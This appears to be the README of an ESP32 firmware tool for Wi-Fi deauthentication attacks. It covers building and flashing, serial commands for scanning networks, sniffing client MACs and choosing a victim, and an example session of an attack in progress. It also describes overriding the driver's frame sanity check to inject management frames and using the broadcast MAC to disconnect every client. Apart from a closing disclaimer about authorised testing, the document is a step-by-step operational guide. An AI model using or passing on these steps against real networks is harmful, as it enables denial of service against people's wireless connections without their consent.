# ESP32 WiFi Deauthentication Attack

Educational Proof of Concept for Network Systems Security.

## Overview
A lightweight, serial-only ESP32 tool for performing 802.11 deauthentication attacks. No display or buttons required.

## Hardware Requirements
- ESP32 development board (any variant with WiFi)
- USB cable for flashing and serial communication
- PlatformIO installed on your PC

## Build & Flash

```bash
# Navigate to the project directory
cd deauth_only

# Build the project
pio run

# Flash to ESP32
pio run --target upload

# Open serial monitor
pio device monitor
```

## Usage

### Interactive Mode (Recommended)
Type `auto` in the serial monitor. The ESP32 will:
1. Scan for nearby WiFi networks and display a numbered list
2. You select a target network by number
3. ESP32 sniffs for connected devices (10 seconds) and lists their MAC addresses
4. You select a target device by number
5. Deauth attack starts automatically

### Manual Mode
```
scan                  - List nearby networks
set_bssid <MAC>       - Set target AP MAC (e.g., AA:BB:CC:DD:EE:FF)
set_channel <1-14>    - Set WiFi channel
set_victim <MAC>      - Set target device MAC
start                 - Begin deauth attack
stop                  - Stop attack
status                - Show attack status
config                - Show current configuration
help                  - Show all commands
```

### Example Session
```
> auto
[*] Scanning for nearby WiFi networks...
[+] Found 3 networks:

Num | SSID                     | CH | RSSI | Security       | BSSID
----+--------------------------+----+------+----------------+-----------------
  1 | MyHomeWiFi               |  6 |  -45 | WPA2           | AA:BB:CC:DD:EE:FF
  2 | NeighborNet              | 11 |  -72 | WPA/WPA2       | 11:22:33:44:55:66
  3 | CoffeeShop               |  1 |  -60 | OPEN           | 77:88:99:AA:BB:CC

Select target network (number):
> 1

[*] Selected network (BSSID: AA:BB:CC:DD:EE:FF, Channel: 6)
[*] Sniffing for connected devices (10 seconds)...

[+] Detected 2 device(s) on this network:

Num | MAC Address         | Notes
----+---------------------+---------------------------
  1 | B4:8C:9D:EC:D9:25   |
  2 | 4E:C0:D9:70:22:06   | Randomized MAC

Select target device (number):
> 1

[*] Target selected: B4:8C:9D:EC:D9:25
[*] Starting deauth attack...

[+] Attack started! Monitor your target device.
    Type 'stop' to end the attack.
[*] Deauth running for 10s | Frames: 450
```

## How It Works
1. **Frame Injection**: Uses `esp_wifi_80211_tx()` to send raw 802.11 deauth frames
2. **Sanity Check Bypass**: Overrides `ieee80211_raw_frame_sanity_check()` to allow management frame injection
3. **Channel Sync**: Automatically switches to the target AP's channel
4. **Passive Sniffing**: Uses promiscuous mode to discover connected client MACs

## Limitations
- **2.4GHz only**: ESP32 hardware does not support 5GHz
- **PMF/802.11w**: Deauth is blocked if Protected Management Frames are enabled
- **Single target**: Attacks one MAC at a time (use broadcast MAC `FF:FF:FF:FF:FF:FF` for all)

## Troubleshooting
| Issue | Solution |
|-------|----------|
| No networks in scan | Move ESP32 closer to AP, check antenna |
| Attack starts but no disconnect | Verify BSSID matches AP's actual MAC (check with `iw dev link`) |
| Channel mismatch | ESP32 must be on exact same channel as AP |
| Port busy on flash | Close serial monitor, run `pio run --target upload` |

## Educational Purpose
This tool is designed for educational and authorized security testing only. Unauthorized deauthentication attacks against networks you do not own or have explicit permission to test are illegal in most jurisdictions.
